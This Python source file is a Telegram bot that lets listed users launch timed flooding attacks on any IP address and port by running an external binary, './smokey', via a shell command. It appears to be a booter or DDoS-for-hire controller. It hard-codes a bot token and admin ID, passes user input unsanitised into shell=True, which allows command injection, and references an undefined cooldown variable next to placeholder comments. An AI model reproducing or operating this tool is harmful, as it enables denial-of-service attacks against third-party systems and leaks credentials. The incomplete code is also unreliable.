import telebot
import subprocess
import datetime
import os
import time
import threading

# Insert your Telegram bot token here
bot = telebot.TeleBot('7623804344:AAEQXxUg9DAlaO-NI8xjcho7ml0NxAN0yA0')

# Admin user IDs
admin_id = {"6284940908"}
USER_FILE = "users1.txt"
LOG_FILE = "command_logs.txt"
FREE_USER_FILE = "free_users.txt"
free_user_credits = {}

# Dictionary to store active attacks and their timers
active_attacks = {}

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()
read_free_users()

def record_command_logs(user_id, command, target, port, time):
    with open(LOG_FILE, "a") as file:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"[{timestamp}] UserID: {user_id} Command: {command} Target: {target} Port: {port} Time: {time}\n")

def log_command(user_id, target, port, time):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] User {user_id} attacked {target}:{port} for {time} seconds\n"
    with open("attack_logs.txt", "a") as file:
        file.write(log_message)

def update_attack_message(chat_id, message_id, target, port, total_time, remaining_time):
    if remaining_time > 0:
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"🔥 ATTACK IN PROGRESS 🔥\n\nTarget: {target}\nPort: {port}\nTime remaining: {remaining_time} seconds\n\nMethod: Free"
            )
            # Schedule the next update
            threading.Timer(1.0, update_attack_message, args=[chat_id, message_id, target, port, total_time, remaining_time - 1]).start()
        except Exception as e:
            print(f"Error updating message: {e}")
    else:
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"✅ ATTACK COMPLETED ✅\n\nTarget: {target}\nPort: {port}\nDuration: {total_time} seconds\n\nMethod: Free"
            )
            # Remove from active attacks
            if chat_id in active_attacks:
                del active_attacks[chat_id]
        except Exception as e:
            print(f"Error finalizing message: {e}")

def start_attack_reply(message, king, soulking, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🔥 ATTACK STARTED 🔥\n\nTarget: {king}\nPort: {soulking}\nTime remaining: {time} seconds\n\nMethod: Free"
    
    # Send the initial message and store its message_id
    sent_message = bot.reply_to(message, response)
    
    # Start the countdown timer
    active_attacks[message.chat.id] = {
        'target': king,
        'port': soulking,
        'total_time': time,
        'message_id': sent_message.message_id
    }
    
    # Start the countdown updates
    update_attack_message(
        chat_id=message.chat.id,
        message_id=sent_message.message_id,
        target=king,
        port=soulking,
        total_time=time,
        remaining_time=time - 1
    )

# [Rest of your existing commands (add, remove, id, etc.) remain the same...]

@bot.message_handler(commands=['la'])
def handle_soul(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in soul_cooldown and (datetime.datetime.now() - soul_cooldown[user_id]).seconds < 1:
                response = "You Are On Cooldown. Please Wait Before Running The /la Command Again."
                bot.reply_to(message, response)
                return
            soul_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  
            king = command[1]
            soulking = command[2]
            time = command[3]
            
            try:
                time_int = int(time)
                if time_int > 300:
                    response = "Error: Time interval must be less than 300 seconds."
                    bot.reply_to(message, response)
                    return
            except ValueError:
                response = "Error: Time must be a valid number."
                bot.reply_to(message, response)
                return
            
            # Check if user already has an active attack
            if message.chat.id in active_attacks:
                response = "You already have an active attack. Please wait for it to complete."
                bot.reply_to(message, response)
                return
            
            record_command_logs(user_id, '/la', king, soulking, time)
            log_command(user_id, king, soulking, time)
            
            # Execute the attack in a separate thread
            def run_attack():
                try:
                    full_command = f"./smokey {king} {soulking} {time} 599"
                    subprocess.run(full_command, shell=True, check=True)
                except subprocess.CalledProcessError as e:
                    print(f"Attack failed: {e}")
                except Exception as e:
                    print(f"Unexpected error during attack: {e}")
            
            attack_thread = threading.Thread(target=run_attack)
            attack_thread.start()
            
            # Show the countdown timer
            start_attack_reply(message, king, soulking, time_int)
            
        else:
            response = "USE NOW✅ :- /la <IP> <Port> <time>"
    else:
        response = "ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡."

    if 'response' in locals():
        bot.reply_to(message, response)

# [Rest of your existing code remains the same...]

if __name__ == '__main__':
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error in polling: {e}")
            time.sleep(10)
